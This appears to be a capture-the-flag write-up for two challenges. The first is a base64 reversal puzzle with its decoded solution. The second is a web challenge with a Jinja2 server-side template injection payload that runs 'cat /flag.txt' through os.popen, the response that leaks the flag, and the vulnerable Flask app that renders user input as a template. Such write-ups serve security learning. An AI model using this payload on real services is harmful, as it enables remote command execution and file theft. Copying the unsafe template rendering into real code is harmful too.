
## Sameer's challenge (reversal)

``` python
import base64

from flag import FLAG

s = ""
for i in range(len(FLAG)):
    if (i % 4) == 0:
        s += base64.b64encode(FLAG[i].encode("ascii")).decode("ascii")
    else:
        s += FLAG[i]

print(s)

assert s[0] == "Q"
assert s[1] == "Q"
assert s[20] == "_"
assert s[4] == "S"
assert s[5] == "V"
assert s[29] == "w"
assert s[7] == "d"
assert s[23] == "="
assert s[24] == "="
assert s[25] == "o"
assert s[8] == "w"
assert s[15] == "A"
assert s[16] == "="
assert s[17] == "="
assert s[18] == "m"
assert s[9] == "="
assert s[30] == "="
assert s[31] == "="
assert s[32] == "}"
assert s[10] == "="
assert s[11] == "3"
assert s[12] == "l"
assert s[13] == "c"
assert s[14] == "M"
assert s[2] == "="
assert s[3] == "="
assert s[19] == "3"
assert s[28] == "M"
assert s[21] == "d"
assert s[22] == "A"
assert s[6] == "{"
assert s[26] == "_"
assert s[27] == "R"
```

Solution
``` python
# assert s[0] == "Q"
# assert s[1] == "Q"
# assert s[2] == "="
# assert s[3] == "="
## A
# assert s[4] == "S"
# assert s[5] == "V"
# assert s[6] == "{"
## ASV{
# assert s[7] == "d"
# assert s[8] == "w"
# assert s[9] == "="
# assert s[10] == "="
## ASV{w
# assert s[11] == "3"
# assert s[12] == "l"
# assert s[13] == "c"
## ASV{w3lc
# assert s[14] == "M"
# assert s[15] == "A"
# assert s[16] == "="
# assert s[17] == "="
## ASV{w3lc0
# assert s[18] == "m"
# assert s[19] == "3"
# assert s[20] == "_"
## ASV{w3lc0m3_
# assert s[21] == "d"
# assert s[22] == "A"
# assert s[23] == "="
# assert s[24] == "="
## ASV{w3lc0m3_t
# assert s[25] == "o"
# assert s[26] == "_"
# assert s[27] == "R"
## ASV{w3lc0m3_to_R
# assert s[28] == "M"
# assert s[29] == "w"
# assert s[30] == "="
# assert s[31] == "="
## ASV{w3lc0m3_to_R3}
# assert s[32] == "}"
```

## Happy Birthday (web)

HTTP Request
```
name={{"foo".__class__.__base__.__subclasses__()[182].__init__.__globals__['sys'].modules['os'].popen("cat+/flag.txt").read()}}
```

HTTP Response
```
 <h1 class="turt-header">
 Happy Birthday 
 ASV{f31d34e2b726b385741db15fec005661}!
 </h1>
```

### app.py
``` python
from flask import Flask, request, render_template
from jinja2 import Environment

app = Flask(__name__)
Jinja2 = Environment()

@app.route('/',methods=['GET', 'POST'])
def home_page():
    if request.method == 'GET':
        output = "Birthday Card Generator"
        is_value = False
        return  render_template('home.html', output=output,is_value=is_value)
    else:
        name = request.values.get('name', None)
        output = Jinja2.from_string('Happy Birthday ' + name + '!').render()
        is_value = True
        return render_template('home.html', output=output,is_value=is_value)


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
```
